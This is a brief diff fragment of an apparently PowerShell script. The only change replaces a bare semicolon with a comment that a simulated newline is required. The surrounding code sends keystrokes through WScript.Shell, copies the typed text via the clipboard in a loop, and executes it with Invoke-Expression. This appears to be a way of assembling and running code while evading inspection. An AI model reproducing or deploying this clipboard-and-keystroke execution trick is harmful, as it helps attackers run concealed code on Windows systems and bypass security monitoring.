@@ -12,7 +12,7 @@ $wshell.SendKeys('ipt');Start-Sleep -Milliseconds 500; $wshell.SendKeys('.');Sta
 $res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 3500;
 $res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();
 IEX($res);
-;
+# simulating new line <- this line is also required!
 
 #>
 
